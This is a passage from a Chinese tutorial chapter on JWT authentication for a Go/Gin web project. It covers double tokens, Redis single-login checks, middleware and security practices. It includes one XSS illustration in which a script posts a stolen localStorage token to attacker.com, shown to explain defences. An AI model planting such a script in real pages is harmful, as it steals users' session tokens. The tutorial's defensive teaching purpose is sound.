# 第08章:JWT认证与登录功能实现

> **本章导读**
>
> 在上一章中,我们完成了用户的注册和密码加密存储。现在的核心任务是:**如何证明"我是我"?**
>
> 传统的 Web 开发常用 Cookie-Session 模式,但在前后端分离和微服务架构中,**JWT (JSON Web Token)** 已成为事实上的标准。本章将带领你实现基于 JWT 的登录认证系统,并集成 Redis 实现更安全的"单点登录"管控。

---

## 📚 本章目标

学完本章,你将掌握:

1. 理解 JWT 的核心原理 (Header.Payload.Signature)
2. 使用 `golang-jwt/jwt` 库生成和解析 Token
3. 实现 Access Token (短效) + Refresh Token (长效) 双令牌机制
4. 编写 Gin 中间件拦截未登录请求
5. 集成 Redis 实现 Token 的状态管理 (单点登录/踢人下线)
6. 掌握 JWT 的安全最佳实践

---

## 1. 为什么选择 JWT?

### 1.1 传统 Session 认证的痛点

在传统的 Web 应用中,服务器会在用户登录后创建一个 Session,并将 SessionID 通过 Cookie 返回给浏览器。

**Session 认证流程:**

```
用户登录 → 服务器创建 Session → 返回 SessionID (Cookie)
         → 后续请求携带 SessionID → 服务器根据 SessionID 查找 Session
```

**Session 模式的问题:**

| 问题维度 | Session 的痛点 | JWT 的解决方案 |
|---------|--------------|--------------|
| **水平扩展** | Session 存储在单台服务器内存中,扩展时需要 Session 同步或共享存储 | Token 存储在客户端,服务端无状态,天然支持水平扩展 |
| **跨域支持** | Cookie 有跨域限制,需要额外配置 CORS 和 SameSite | Token 放在 HTTP Header 中,不受跨域限制 |
| **移动端支持** | 移动端 App 不支持 Cookie | Token 可以存储在本地,灵活性更强 |
| **微服务架构** | 多个服务共享 Session 麻烦,需要 Redis 等中心化存储 | Token 自包含用户信息,各服务独立验证 |

**Bluebell 项目选择 JWT 的原因:**

我们需要构建一个支持多端(Web、App、小程序)接入的 API 服务,JWT 的无状态特性非常适合这种场景。同时,为了解决 JWT "难撤销"的缺点,我们引入了 Redis 进行状态管控。

### 1.2 JWT 的核心原理

JWT 的全称是 **JSON Web Token**,它是一个包含三部分的字符串:

```
Header.Payload.Signature
```

**示例 JWT:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NTY3ODkwLCJ1c2VybmFtZSI6ImxheSIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**三部分详解:**

#### 1) Header (头部)

```json
{
  "alg": "HS256",   // 签名算法 (HMAC SHA256)
  "typ": "JWT"      // Token 类型
}
```

经过 Base64URL 编码后得到第一部分: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

#### 2) Payload (负载)

包含实际的业务数据,也称为 **Claims (声明)**。

```json
{
  "user_id": 1234567890,
  "username": "lay",
  "exp": 1616239022,     // 过期时间 (Unix 时间戳)
  "iss": "bluebell"      // 签发者
}
```

**注意:** Payload 只是 Base64URL 编码,**不是加密**! 任何人都可以解码看到内容,所以不要放敏感信息(如密码)。

经过 Base64URL 编码后得到第二部分。

#### 3) Signature (签名)

签名用于验证 Token 的完整性,防止篡改。

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**签名的作用:**

- ✅ **防篡改**: 如果有人修改了 Header 或 Payload,签名就会失效。
- ✅ **验证身份**: 只有持有 `secret` 的服务器才能生成和验证签名。

**JWT 验证流程:**

```
客户端请求 → 服务器解析 JWT → 提取 Header 和 Payload
          → 使用相同算法和 Secret 重新计算签名
          → 比对签名是否一致 → 一致则通过,不一致则拒绝
```

### 1.3 JWT vs Session 完整对比

| 特性 | Session 模式 | JWT 模式 |
|------|-------------|----------|
| **存储位置** | 服务端内存/Redis | 客户端 (Header/LocalStorage) |
| **扩展性** | ❌ 差 (依赖服务端状态) | ✅ **极好** (无状态) |
| **跨域支持** | ❌ 麻烦 (Cookie 跨域) | ✅ **简单** (HTTP Header) |
| **移动端支持**| ❌ 差 (Cookie 限制) | ✅ **友好** (Token 存储灵活) |
| **撤销难度** | ✅ 简单 (删服务端 Session) | ❌ 困难 (需配合黑名单/Redis) |
| **性能** | 需要查询存储 (Redis/DB) | 无需查询,直接验证签名 |
| **安全性** | SessionID 泄露风险低 | Token 泄露风险较高,需 HTTPS |

**我们的混合方案:**

- **使用 JWT** 获得无状态的扩展性和跨平台支持
- **使用 Redis** 存储 Token,解决撤销困难的问题
- **双 Token 机制** (Access Token + Refresh Token) 提升安全性

---

## 2. JWT 工具包实现

我们使用社区最流行的 `github.com/golang-jwt/jwt/v5` 库。

### 2.1 安装依赖

```bash
go get -u github.com/golang-jwt/jwt/v5
```

### 2.2 定义 Claims (荷载)

在 `pkg/jwt/jwt.go` 中,我们定义包含业务数据的结构体:

```go
package jwt

import (
	"errors"
	"strconv"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

// MySecret 用于签名的密钥
// 注意:生产环境请从配置文件读取,严禁硬编码!
var MySecret = []byte("Lay不吃压力")

// Token 过期时间
const AccessTokenExpireDuration = time.Minute * 10       // 10分钟
const RefreshTokenExpireDuration = time.Hour * 24 * 30   // 30天

// UserClaims 自定义声明结构体并内嵌 jwt.RegisteredClaims
// 为什么:需要将 UserID 和 Username 放入 Token 中,方便后续业务使用
type UserClaims struct {
	UserID   int64  `json:"user_id"`
	Username string `json:"username"`
	jwt.RegisteredClaims
}
```

**为什么要内嵌 `jwt.RegisteredClaims`?**

`RegisteredClaims` 包含了 JWT 标准定义的7个保留字段:

```go
type RegisteredClaims struct {
    Issuer    string             // iss (签发者)
    Subject   string             // sub (主题,通常是用户ID)
    Audience  ClaimStrings       // aud (接收方)
    ExpiresAt *NumericDate       // exp (过期时间)
    NotBefore *NumericDate       // nbf (生效时间)
    IssuedAt  *NumericDate       // iat (签发时间)
    ID        string             // jti (JWT ID)
}
```

我们在自定义结构体中内嵌它,可以直接使用这些标准字段,同时添加自己的业务字段 (`UserID`、`Username`)。

### 2.3 生成 Token (GenToken)

我们采用 **双 Token 机制**:

- **Access Token**: 有效期短 (10分钟),用于日常接口认证。
- **Refresh Token**: 有效期长 (30天),仅用于刷新 Access Token。

**为什么需要双 Token?**

1. **安全性**: Access Token 有效期短,即使泄露,影响时间也有限。
2. **用户体验**: Refresh Token 有效期长,避免用户频繁登录。
3. **灵活性**: 可以在 Refresh Token 刷新时检查用户状态(是否被封禁、权限变更等)。

```go
// GenToken 生成 Access Token 和 Refresh Token
func GenToken(userID int64, username string) (aToken, rToken string, err error) {
	// 1. 创建 Access Token
	c := UserClaims{
		UserID:   userID,
		Username: username,
		RegisteredClaims: jwt.RegisteredClaims{
			Subject:   strconv.FormatInt(userID, 10), // 主题 (用户ID)
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(AccessTokenExpireDuration)), // 过期时间
			Issuer:    "bluebell", // 签发人
		},
	}
	// 使用 HS256 签名算法进行签名
	aToken, err = jwt.NewWithClaims(jwt.SigningMethodHS256, c).SignedString(MySecret)
	if err != nil {
		return "", "", err
	}

	// 2. 创建 Refresh Token
	// 不需要包含自定义数据,只需要标准声明
	rToken, err = jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.RegisteredClaims{
		Subject:   strconv.FormatInt(userID, 10),
		ExpiresAt: jwt.NewNumericDate(time.Now().Add(RefreshTokenExpireDuration)),
		Issuer:    "bluebell",
	}).SignedString(MySecret)
	if err != nil {
		return "", "", err
	}

	return aToken, rToken, nil
}
```

**代码细节解析:**

1. **`jwt.NewWithClaims(method, claims)`**: 创建一个新的 Token 对象。
   - `method`: 签名算法,这里使用 `SigningMethodHS256` (HMAC-SHA256)。
   - `claims`: 负载数据 (Payload)。

2. **`SignedString(secret)`**: 使用密钥对 Token 进行签名,生成完整的 JWT 字符串。

3. **为什么 Refresh Token 不包含 `UserID` 和 `Username`?**
   - Refresh Token 的唯一作用是换取新的 Access Token。
   - 刷新时会重新查询数据库,获取最新的用户信息。
   - 这样可以在用户信息变更(如改名、封禁)时及时生效。

### 2.4 解析 Token (ParseToken)

```go
// ParseToken 解析 JWT
func ParseToken(tokenString string) (*UserClaims, error) {
	// 解析 Token
	var mc = new(UserClaims)
	token, err := jwt.ParseWithClaims(tokenString, mc, func(token *jwt.Token) (i interface{}, err error) {
		// 这个回调函数返回签名密钥
		// jwt 库会用这个密钥验证签名
		return MySecret, nil
	})

	if err != nil {
		return nil, err
	}

	// 校验 Token 是否有效
	if token.Valid {
		return mc, nil
	}

	return nil, errors.New("invalid token")
}
```

**`jwt.ParseWithClaims` 工作流程:**

```
1. 分割 JWT 字符串 (按 . 分割成三部分)
2. Base64 解码 Header 和 Payload
3. 调用回调函数获取密钥 (这里返回 MySecret)
4. 使用相同算法重新计算签名
5. 比对计算出的签名和 Token 中的签名是否一致
6. 检查 Token 是否过期 (ExpiresAt)
7. 返回解析结果
```

**为什么需要回调函数?**

因为不同的 Token 可能使用不同的密钥。回调函数允许你根据 Token 的内容 (如 `token.Header["kid"]`) 动态选择密钥。在我们的项目中,所有 Token 使用同一个密钥,所以直接返回 `MySecret`。

---

## 3. Service 层 (业务逻辑)

在 `internal/service/user/user_service.go` 中,我们需要组合 **密码验证**、**Token 生成** 和 **Redis 存储**。

### 3.1 为什么需要 Redis?

标准的 JWT 是无状态的,一旦签发,在过期前无法强制失效。这带来几个问题:

1. **密码修改后旧 Token 仍有效**: 用户改了密码,但旧 Token 在过期前仍能使用。
2. **无法踢人下线**: 管理员想封禁某个账号,但该账号的 Token 还能用。
3. **无法实现单点登录**: 用户在 A 设备登录后,在 B 设备登录,A 设备的 Token 还能用。

**解决方案: JWT + Redis 混合模式**

将签发的 Access Token 存入 Redis:

```
Key: bluebell:user:access_token:{userID}
Value: {access_token}
TTL: 10分钟 (与 Access Token 过期时间一致)
```

**验证流程:**

```
客户端请求 → 中间件解析 Token → 验证签名 (JWT 验证)
          → 从 Redis 获取该用户的 Token (通过 Repository 接口)
          → 比对是否一致
          → 一致则通过,不一致则拒绝
```

**效果:**

- ✅ **踢人下线**: 删除 Redis 中的 Token,旧 Token 立即失效。
- ✅ **单点登录**: 新登录生成新 Token 覆盖 Redis,旧 Token 失效。
- ✅ **修改密码**: 登出时删除 Redis Token,强制重新登录。

### 3.2 登录逻辑实现

```go
// internal/service/user/user_service.go

package user

import (
	"bluebell/internal/domain/repository"
	"bluebell/internal/dto/request"
	"bluebell/internal/model"
	"bluebell/pkg/errorx"
	"bluebell/pkg/jwt"
	"context"
	"errors"

	"go.uber.org/zap"
)

// UserService 用户业务逻辑服务
type UserService struct {
	userRepo   repository.UserRepository           // 用户数据 Repository
	tokenCache repository.UserTokenCacheRepository  // Token 缓存 Repository
}

// Login 处理用户登录业务逻辑
func (s *UserService) Login(ctx context.Context, p *request.LoginRequest) (string, string, error) {
	user := &model.User{
		Username: p.Username,
		Password: p.Password,
	}

	// 1. 校验用户名和密码 (通过 Repository 接口)
	// CheckLogin 内部会:
	//   - 根据用户名查询用户
	//   - 使用 bcrypt.CompareHashAndPassword 验证密码
	//   - 验证成功后,会将 user.UserID 填充进去
	err := s.userRepo.CheckLogin(ctx, user)
	if err != nil {
		if errors.Is(err, repository.ErrUserNotExist) {
			return "", "", errorx.ErrUserNotExist
		}
		if errors.Is(err, repository.ErrInvalidPassword) {
			return "", "", errorx.ErrInvalidPassword
		}
		zap.L().Error("userRepo.CheckLogin failed",
			zap.String("username", p.Username),
			zap.Error(err))
		return "", "", errorx.ErrServerBusy
	}

	// 2. 生成 JWT Token
	aToken, rToken, err := jwt.GenToken(user.UserID, user.Username)
	if err != nil {
		zap.L().Error("jwt.GenToken failed",
			zap.Int64("user_id", user.UserID),
			zap.Error(err))
		return "", "", errorx.ErrServerBusy
	}

	// 3. 将 Token 存入 Redis (通过 Repository 接口)
	// 实现单点登录/互踢
	err = s.tokenCache.SetUserToken(ctx, user.UserID, aToken, rToken,
		jwt.AccessTokenExpireDuration, jwt.RefreshTokenExpireDuration)
	if err != nil {
		zap.L().Error("tokenCache.SetUserToken failed",
			zap.Int64("user_id", user.UserID),
			zap.Error(err))
		return "", "", errorx.ErrServerBusy
	}

	return aToken, rToken, nil
}
```

**逻辑流程图:**

```
用户提交登录表单
    ↓
Handler 参数校验
    ↓
UserService.Login()
    ├─→ 1. s.userRepo.CheckLogin() ── 验证用户名和密码
    │       ├─ 查询用户
    │       ├─ bcrypt 验证密码
    │       └─ 填充 user.UserID
    │
    ├─→ 2. jwt.GenToken() ─────  生成双 Token
    │       ├─ 生成 Access Token (10分钟)
    │       └─ 生成 Refresh Token (30天)
    │
    └─→ 3. s.tokenCache.SetUserToken() ─ 存储到 Redis
            ├─ 存储 Access Token (Key: user:access_token:{id})
            └─ 存储 Refresh Token (Key: user:refresh_token:{id})
    ↓
返回 Token 给客户端
```

### 3.3 Token 缓存 Repository 接口

DAO 层通过 Repository 接口与 Service 层解耦:

```go
// internal/domain/repository/cache.go

// UserTokenCacheRepository 用户Token缓存仓储接口
type UserTokenCacheRepository interface {
	SetUserToken(ctx context.Context, userID int64, aToken, rToken string, aExp, rExp time.Duration) error
	GetUserAccessToken(ctx context.Context, userID int64) (string, error)
	GetUserRefreshToken(ctx context.Context, userID int64) (string, error)
	DeleteUserToken(ctx context.Context, userID int64) error
}
```

**为什么使用 Repository 接口?**

- Service 层不直接依赖 `dao/redis` 包
- 可以轻松替换缓存实现 (Redis → Memcached → 本地缓存)
- 方便编写单元测试 (Mock 接口)

**Redis Key 设计原则:**

```
项目前缀:业务模块:具体功能:{动态ID}
bluebell:user:access_token:123
```

这样设计的好处:
- ✅ 避免 Key 冲突
- ✅ 方便批量查询 (如 `KEYS bluebell:user:*`)
- ✅ 语义清晰

---

## 4. Handler 层 (请求处理)

在 `internal/handler/user_handler.go` 中处理 HTTP 请求。

```go
// internal/handler/user_handler.go

package handler

import (
	"bluebell/internal/dto/request"
	"bluebell/pkg/errorx"

	"github.com/gin-gonic/gin"
	"github.com/go-playground/validator/v10"
)

// LoginHandler 处理用户登录请求
// 使用 errorx 错误处理机制：
//   1. Service 层负责决定错误码（业务错误返回 CodeError,系统错误返回 ErrServerBusy）
//   2. Handler 层只需要调用 HandleError 透传响应
func (h *Handlers) LoginHandler(c *gin.Context) {
	var p request.LoginRequest

	// 1. 参数校验
	if err := c.ShouldBindJSON(&p); err != nil {
		errs, ok := err.(validator.ValidationErrors)
		if !ok {
			HandleError(c, errorx.ErrInvalidParam)
			return
		}
		ResponseErrorWithMsg(c, errorx.CodeInvalidParam, removeTopStruct(errs.Translate(trans)))
		return
	}

	// 2. 业务处理 (通过依赖注入调用 Service 层)
	aToken, rToken, err := h.Services.User.Login(c.Request.Context(), &p)
	if err != nil {
		// 3. 统一错误处理
		// HandleError 自动识别 errorx.CodeError 并返回对应的错误码
		HandleError(c, err)
		return
	}

	// 4. 返回响应
	ResponseSuccess(c, map[string]string{
		"access_token":  aToken,
		"refresh_token": rToken,
	})
}
```

**Handler 层的职责:**

1. ✅ 参数绑定和校验 (`ShouldBindJSON`)
2. ✅ 通过 `h.Services` 调用 Service 层处理业务 (依赖注入)
3. ✅ 使用 `HandleError` 统一处理错误
4. ✅ 构造响应 (统一格式)

**不应该出现的逻辑:**

- ❌ 直接操作数据库
- ❌ 复杂的业务判断
- ❌ Token 生成等工具调用

---

## 5. JWT 认证中间件

这是保护 API 接口的关键屏障。只有携带有效 Token 的请求才能通过。

### 5.1 中间件实现 (`internal/infrastructure/middleware/auth.go`)

中间件通过**依赖注入**接收 `UserTokenCacheRepository` 接口,不直接依赖 `dao/redis` 包:

```go
// internal/infrastructure/middleware/auth.go

package middleware

import (
	"bluebell/internal/domain/repository"
	"bluebell/internal/handler"
	"bluebell/pkg/errorx"
	"bluebell/pkg/jwt"
	"strings"

	"github.com/gin-gonic/gin"
)

// JWTAuthMiddleware 基于JWT的认证中间件
// tokenCache: 通过依赖注入传入的 Token 缓存接口
func JWTAuthMiddleware(tokenCache repository.UserTokenCacheRepository) func(c *gin.Context) {
	return func(c *gin.Context) {
		// 1. 获取 Authorization header
		authHeader := c.Request.Header.Get("Authorization")
		if authHeader == "" {
			handler.ResponseError(c, errorx.ErrNeedLogin)
			c.Abort()
			return
		}

		// 2. 按空格分割
		parts := strings.SplitN(authHeader, " ", 2)
		if !(len(parts) == 2 && parts[0] == "Bearer") {
			handler.ResponseError(c, errorx.ErrInvalidToken)
			c.Abort()
			return
		}

		// 3. 解析 Token
		mc, err := jwt.ParseToken(parts[1])
		if err != nil {
			handler.ResponseError(c, errorx.ErrInvalidToken)
			c.Abort()
			return
		}

		// 4. 单点登录校验: 通过 Repository 接口查询 Redis
		redisToken, err := tokenCache.GetUserAccessToken(c.Request.Context(), mc.UserID)
		if err != nil {
			handler.ResponseError(c, errorx.ErrNeedLogin)
			c.Abort()
			return
		}

		// 如果 Redis 中的 Token 与请求的 Token 不一致,说明账号已在其他设备登录
		if parts[1] != redisToken {
			handler.ResponseErrorWithMsg(c, errorx.CodeInvalidToken, "账号已在其他设备登录")
			c.Abort()
			return
		}

		// 5. 将当前请求的 userID 信息保存到请求的上下文 c 上
		c.Set(handler.CtxUserIDKey, mc.UserID)
		c.Next()
	}
}
```

**中间件执行流程:**

```
HTTP 请求
    ↓
1. 提取 Authorization Header
    ├─ 没有 → 返回 "需要登录"
    └─ 有 → 继续
    ↓
2. 解析 "Bearer <token>" 格式
    ├─ 格式错误 → 返回 "Token 格式错误"
    └─ 格式正确 → 继续
    ↓
3. JWT 验证 (ParseToken)
    ├─ 验签失败 → 返回 "Token 无效"
    ├─ Token 过期 → 返回 "Token 无效"
    └─ 验证通过 → 继续
    ↓
4. Redis 验证 (tokenCache.GetUserAccessToken)
    ├─ Redis 无此 Key → 返回 "需要登录"
    ├─ Token 不一致 → 返回 "账号已在其他设备登录"
    └─ Token 一致 → 继续
    ↓
5. 注入 UserID 到上下文 (c.Set)
    ↓
放行 (c.Next)
    ↓
业务 Handler 执行
```

**为什么需要 `c.Abort()`?**

`c.Abort()` 会阻止调用链中的后续处理函数。如果不调用 `c.Abort()`,即使返回了错误响应,后续的业务 Handler 仍会执行,可能导致意外行为。

**如何在 Handler 中获取 UserID?**

```go
func (h *Handlers) SomeHandler(c *gin.Context) {
    // 从上下文中获取 UserID
    userID, exists := c.Get(CtxUserIDKey)
    if !exists {
        // 理论上不会走到这里,因为中间件已经验证过了
        HandleError(c, errorx.ErrNeedLogin)
        return
    }

    // 类型断言
    uid := userID.(int64)

    // 使用 uid 进行业务逻辑
    // ...
}
```

**辅助函数:**

```go
// internal/handler/handler.go
const CtxUserIDKey = "userID"

// GetCurrentUser 从上下文中获取当前用户 ID
func GetCurrentUser(c *gin.Context) (userID int64, err error) {
    uid, ok := c.Get(CtxUserIDKey)
    if !ok {
        err = ErrorUserNotLogin
        return
    }
    userID, ok = uid.(int64)
    if !ok {
        err = ErrorUserNotLogin
        return
    }
    return userID, nil
}
```

### 5.2 注册路由 (`internal/router/router.go`)

路由注册通过依赖注入接收 `*handler.Handlers` 和 `tokenCache`:

```go
// internal/router/router.go

package router

import (
	"bluebell/internal/domain/repository"
	"bluebell/internal/handler"
	"bluebell/internal/infrastructure/logger"
	"bluebell/internal/infrastructure/middleware"

	"github.com/gin-gonic/gin"
)

func SetupRouter(
	mode string,
	h *handler.Handlers,
	tokenCache repository.UserTokenCacheRepository,
) *gin.Engine {
	if mode == gin.ReleaseMode {
		gin.SetMode(gin.ReleaseMode)
	}

	r := gin.New()
	r.Use(logger.GinLogger(), logger.GinRecovery(true))

	v1 := r.Group("/api/v1")

	// 公共路由
	{
		v1.POST("/signup", h.SignUpHandler)
		v1.POST("/login", h.LoginHandler)
		v1.POST("/refresh_token", h.RefreshTokenHandler)
	}

	// 认证路由 (通过依赖注入传入 tokenCache)
	authGroup := v1.Group("")
	authGroup.Use(middleware.JWTAuthMiddleware(tokenCache))
	{
		authGroup.GET("/community", h.CommunityHandler)
		authGroup.GET("/community/:id", h.CommunityHandlerByID)

		authGroup.POST("/post", h.CreatePostHandler)
		authGroup.GET("/post/:id", h.GetPostDetailHandler)
		authGroup.DELETE("/post/:id", h.DeletePostHandler)
		authGroup.GET("/posts", h.GetPostListHandler)

		authGroup.POST("/vote", h.PostVoteHandler)
	}

	return r
}
```

**路由分组的好处:**

```go
// ❌ 不好的写法 (每个路由都要加中间件)
r.GET("/api/v1/community", middleware.JWTAuthMiddleware(tokenCache), handler)
r.GET("/api/v1/post/:id", middleware.JWTAuthMiddleware(tokenCache), handler)

// ✅ 好的写法 (路由分组)
authGroup.Use(middleware.JWTAuthMiddleware(tokenCache))
{
    authGroup.GET("/community", h.CommunityHandler)
    authGroup.GET("/post/:id", h.GetPostDetailHandler)
}
```

---

## 6. 测试验证

### 6.1 登录获取 Token

**请求:**

```bash
curl -X POST http://localhost:8080/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "lay",
    "password": "123456"
  }'
```

**响应:**

```json
{
  "code": 1000,
  "msg": "success",
  "data": {
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NTY3ODkwLCJ1c2VybmFtZSI6ImxheSIsInN1YiI6IjEyMzQ1Njc4OTAiLCJleHAiOjE2MTYyMzk2MjIsImlzcyI6ImJsdWViZWxsIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNjE4ODMxNjIyLCJpc3MiOiJibHVlYmVsbCJ9.abc123def456..."
  }
}
```

**解析 Access Token (使用 jwt.io):**

在浏览器打开 [https://jwt.io/](https://jwt.io/),粘贴 Access Token,可以看到:

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "user_id": 1234567890,
  "username": "lay",
  "sub": "1234567890",
  "exp": 1616239622,
  "iss": "bluebell"
}
```

### 6.2 访问受保护接口

**不带 Token (应该失败):**

```bash
curl http://localhost:8080/api/v1/ping
```

**响应:**
```json
{
  "code": 1006,
  "msg": "需要登录",
  "data": null
}
```

**带 Token (应该成功):**

```bash
curl http://localhost:8080/api/v1/ping \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**响应:**
```
pong
```

### 6.3 测试单点登录 (互踢)

**场景:** 用户在两个设备上登录,后登录的设备会踢掉先登录的设备。

**步骤:**

1. 在设备 A 上登录,获得 Token A。
2. 在设备 B 上用同一账号登录,获得 Token B。
3. 此时 Redis 中存储的是 Token B。
4. 设备 A 使用 Token A 访问接口,会被拒绝。

**实际测试:**

```bash
# 1. 第一次登录,获取 Token A
TOKEN_A=$(curl -s -X POST http://localhost:8080/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "lay", "password": "123456"}' \
  | jq -r '.data.access_token')

# 2. 使用 Token A 访问接口 (应该成功)
curl http://localhost:8080/api/v1/ping \
  -H "Authorization: Bearer $TOKEN_A"
# 响应: pong

# 3. 第二次登录,获取 Token B (模拟另一个设备)
TOKEN_B=$(curl -s -X POST http://localhost:8080/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "lay", "password": "123456"}' \
  | jq -r '.data.access_token')

# 4. 再次使用 Token A 访问接口 (应该失败)
curl http://localhost:8080/api/v1/ping \
  -H "Authorization: Bearer $TOKEN_A"
# 响应: {"code":1007,"msg":"账号已在其他设备登录","data":null}

# 5. 使用 Token B 访问接口 (应该成功)
curl http://localhost:8080/api/v1/ping \
  -H "Authorization: Bearer $TOKEN_B"
# 响应: pong
```

### 6.4 测试 Token 过期

**Access Token 过期时间是 10 分钟**,等待 10 分钟后再访问接口,会收到 "Token 无效" 的错误。

**实际测试 (不想等 10 分钟):**

可以临时修改 `jwt.go` 中的 `AccessTokenExpireDuration` 为 `time.Second * 5`,然后:

```bash
# 1. 登录获取 Token
TOKEN=$(curl -s -X POST http://localhost:8080/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "lay", "password": "123456"}' \
  | jq -r '.data.access_token')

# 2. 立即访问 (应该成功)
curl http://localhost:8080/api/v1/ping \
  -H "Authorization: Bearer $TOKEN"
# 响应: pong

# 3. 等待 6 秒后访问 (应该失败)
sleep 6
curl http://localhost:8080/api/v1/ping \
  -H "Authorization: Bearer $TOKEN"
# 响应: {"code":1007,"msg":"无效的Token","data":null}
```

---

## 7. 安全最佳实践

### 7.1 HTTPS 是必须的

JWT Token 在 HTTP Header 中传输,如果使用 HTTP 协议,Token 会被明文传输,任何人都可以截获。

**攻击场景:**

```
用户 ─(HTTP)─> 中间人 ─(HTTP)─> 服务器
                 ↓
            窃取 Token
                 ↓
          伪造请求盗取数据
```

**防护措施:**

- ✅ 生产环境必须使用 HTTPS
- ✅ 配置 HSTS (HTTP Strict Transport Security) 强制 HTTPS
- ✅ 使用 Let's Encrypt 免费证书

### 7.2 Secret 密钥管理

**❌ 错误做法:**

```go
// 硬编码在代码中 (严重安全隐患)
var MySecret = []byte("Lay不吃压力")
```

**✅ 正确做法:**

```go
// 从配置文件读取
var MySecret []byte

func Init(secret string) {
    MySecret = []byte(secret)
}
```

**配置文件 (`config.yaml`):**

```yaml
jwt:
  secret: "your-very-long-and-random-secret-key-here"
  access_token_expire: 10m
  refresh_token_expire: 720h  # 30天
```

**生成强密钥:**

```bash
# 使用 openssl 生成 32 字节随机密钥
openssl rand -base64 32
# 输出: 5K8fJ2kL9mN0pQ1rS2tU3vW4xY5zA6bC7dE8fG9hH0i=
```

### 7.3 不要在 Payload 中存储敏感信息

JWT 的 Payload 只是 Base64 编码,任何人都可以解码查看内容。

**❌ 错误做法:**

```go
type UserClaims struct {
    UserID   int64  `json:"user_id"`
    Username string `json:"username"`
    Password string `json:"password"`     // ❌ 永远不要这样做!
    Phone    string `json:"phone"`        // ❌ 敏感信息
    IDCard   string `json:"id_card"`      // ❌ 敏感信息
    jwt.RegisteredClaims
}
```

**✅ 正确做法:**

```go
type UserClaims struct {
    UserID   int64  `json:"user_id"`   // ✅ 非敏感的唯一标识
    Username string `json:"username"`  // ✅ 公开信息
    jwt.RegisteredClaims
}
```

**原则:** 只存储必要的非敏感标识信息。如果需要更多用户信息,应该在业务逻辑中根据 UserID 查询数据库。

### 7.4 Token 存储位置 (前端)

**三种常见方案:**

| 存储位置 | 优点 | 缺点 | 推荐度 |
|---------|------|------|--------|
| **LocalStorage** | 容量大 (5-10MB),API 简单 | **易受 XSS 攻击** | ⚠️ 谨慎使用 |
| **Cookie (HttpOnly)** | **防 XSS** (JS 无法访问) | 易受 CSRF 攻击,跨域麻烦 | ✅ 推荐 (配合 CSRF Token) |
| **Memory (内存)** | 最安全 | 刷新页面就丢失 | ⚠️ 需配合其他方案 |

**最佳实践:**

1. **Access Token 存储在内存中** (如 Vue 的 Pinia Store)
2. **Refresh Token 存储在 HttpOnly Cookie 中**
3. **使用 CORS 配置** 限制允许的域名

**前端代码示例 (Vue 3 + Pinia):**

```javascript
// stores/user.js
import { defineStore } from 'pinia'

export const useUserStore = defineStore('user', {
  state: () => ({
    accessToken: null,  // 存储在内存中
  }),

  actions: {
    setToken(token) {
      this.accessToken = token
    },

    clearToken() {
      this.accessToken = null
    }
  }
})

// axios 拦截器
axios.interceptors.request.use(config => {
  const userStore = useUserStore()
  if (userStore.accessToken) {
    config.headers.Authorization = `Bearer ${userStore.accessToken}`
  }
  return config
})
```

### 7.5 防止 XSS 攻击

**XSS (Cross-Site Scripting) 攻击场景:**

攻击者在评论区插入恶意脚本:

```html
<script>
  // 窃取 LocalStorage 中的 Token
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('access_token')
  })
</script>
```

**防护措施:**

1. **输入验证**: 对用户输入进行严格验证和过滤。
2. **输出转义**: 渲染用户内容时进行 HTML 转义。
3. **CSP (Content Security Policy)**: 限制脚本来源。
4. **HttpOnly Cookie**: Token 存储在 HttpOnly Cookie 中,JS 无法访问。

**后端设置 CSP Header:**

```go
// Gin 中间件
func SecurityHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("Content-Security-Policy", "default-src 'self'")
        c.Header("X-Content-Type-Options", "nosniff")
        c.Header("X-Frame-Options", "DENY")
        c.Header("X-XSS-Protection", "1; mode=block")
        c.Next()
    }
}
```

### 7.6 Token 刷新策略

**Access Token 过期后,有两种处理方式:**

#### 方式一: 静默刷新 (推荐)

```javascript
// axios 响应拦截器
axios.interceptors.response.use(
  response => response,
  async error => {
    if (error.response.status === 401) {  // Token 过期
      // 使用 Refresh Token 刷新
      const newToken = await refreshAccessToken()
      if (newToken) {
        // 更新 Token 并重试原请求
        error.config.headers.Authorization = `Bearer ${newToken}`
        return axios.request(error.config)
      } else {
        // 刷新失败,跳转登录页
        router.push('/login')
      }
    }
    return Promise.reject(error)
  }
)
```

#### 方式二: 定时刷新

```javascript
// 每 9 分钟刷新一次 (Access Token 有效期 10 分钟)
setInterval(async () => {
  if (userStore.accessToken) {
    const newToken = await refreshAccessToken()
    if (newToken) {
      userStore.setToken(newToken)
    }
  }
}, 9 * 60 * 1000)
```

---

## 8. 常见问题 (FAQ)

### Q1: JWT 和 OAuth2 是什么关系?

**A:** JWT 是一种 Token 格式,OAuth2 是一种授权协议。OAuth2 可以使用 JWT 作为 Access Token 的格式,但也可以使用其他格式 (如随机字符串)。

**关系示意图:**

```
OAuth2 (授权协议)
    ├─ Authorization Code 模式
    ├─ Implicit 模式
    ├─ Password 模式
    └─ Client Credentials 模式
         ↓
    Access Token 格式
         ├─ JWT (本章主题)
         ├─ Opaque Token (随机字符串)
         └─ ...
```

### Q2: 如果 Redis 宕机了,用户的登录功能会受影响吗?

